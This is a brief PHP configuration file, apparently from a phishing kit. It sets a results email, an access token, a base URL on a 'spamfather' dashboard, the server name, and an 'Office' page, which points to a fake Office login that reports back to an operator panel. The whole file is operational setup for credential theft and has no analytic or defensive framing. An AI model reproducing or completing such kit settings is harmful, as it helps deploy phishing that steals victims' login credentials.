<?php
$email ="testspam@gmail.com";
$token ="F95EC-3DE39-5B4BC-E25B3-9EF61-38DA8-71-16-70771-623";
$base  ="https://dashboard.spamfather.com/web/";
$domain= $server=$_SERVER['SERVER_NAME'];
$page="Office";
?>